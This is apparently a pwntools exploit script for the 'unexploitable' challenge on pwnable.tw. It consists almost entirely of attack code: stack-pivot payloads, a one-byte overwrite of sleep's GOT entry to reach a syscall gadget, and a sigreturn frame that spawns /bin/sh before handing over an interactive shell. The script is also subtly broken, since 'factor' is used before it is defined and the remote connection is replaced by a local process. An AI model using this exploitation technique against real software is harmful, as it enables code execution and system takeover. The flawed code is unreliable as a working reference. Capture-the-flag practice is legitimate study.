#-*- coding: utf-8 -*-

from pwn import *

context.log_level='debug'

s = remote("chall.pwnable.tw", 10403)
s = process('./unexploitable')
e = ELF("./unexploitable")

#0x40055b
'''
 ► 0x40055b <main+23>    lea    rax, [rbp - 0x10]             <0x601020>
   0x40055f <main+27>    mov    edx, 0x100
   0x400564 <main+32>    mov    rsi, rax
   0x400567 <main+35>    mov    edi, 0
   0x40056c <main+40>    mov    eax, 0
   0x400571 <main+45>    call   read@plt                      <0x400430>
'''

payload1 = 'A' * 0x10
payload1 += p64(0x601030)  # rbp #buf=[rbp-0x10]
payload1 += p64(0x040055B)   # ret -> read()

'''
 ► 0x400571 <main+45>    call   read@plt                      <0x400430>
        fd: 0x0
        buf: 0x601020 (__dso_handle) ◂— 0x0
        nbytes: 0x100
'''

payload2 = p64(0x601078)       # in 0x601020 -> Next rbp2  
payload2 += p64(0x040055B)       # in 0x601028 -> rey2
payload2 += p64(e.got['sleep'] + 0x10)  # in 0x601030 -> Next rbp1
payload2 += p64(0x040055B)       # in 0x601038 -> ret1
payload2 += p64(0x601040)      # in 0x601040
payload2 += p64(e.plt['sleep'])     # in 0x601048

inject_syscall ='\x55' #sleep_got -> syscall

payload3 = 'A' * 0x10 #in 0x601068
payload3 += p64(0x601040)  # in 0x601078 -> Next rbp3 
payload3 += p64(0x040055B)   # in 0x601080 -> ret3
payload3 += 'A' * 0x30      # dummy

factor += p64(0x601120)  # rdi, address of /bin/sh
factor += p64(0) * 4      # rsi, rbp, rbx, rdx
factor += p64(0x3b)     # rax, execve syscall number
factor += p64(0x0) * 2    # rcx, rsp
factor += p64(e.plt['sleep']) # rip
factor += p64(0x0)      # eflags
factor += p32(0x33)     # cs
factor += p32(0) * 3      # gs, 
factor += p64(0)        # err
factor += '/bin/sh\x00'

payload4 = 'A' * 0xf      # sigreturn syscall number

sleep(4)#ready
raw_input('payload1')
s.sendline(payload1)
raw_input('payload1-send')
raw_input('payload2')
s.sendline(payload2)
raw_input('payload2-send')
raw_input('inject_syscall')
s.send(inject_syscall)
raw_input('inject_syscall-send')
raw_input('payload3')
s.send(payload3+factor)
raw_input('payload3-send')
raw_input('payload4')
s.send(payload4)
raw_input('payload4-send')
sleep(1)

s.interactive()

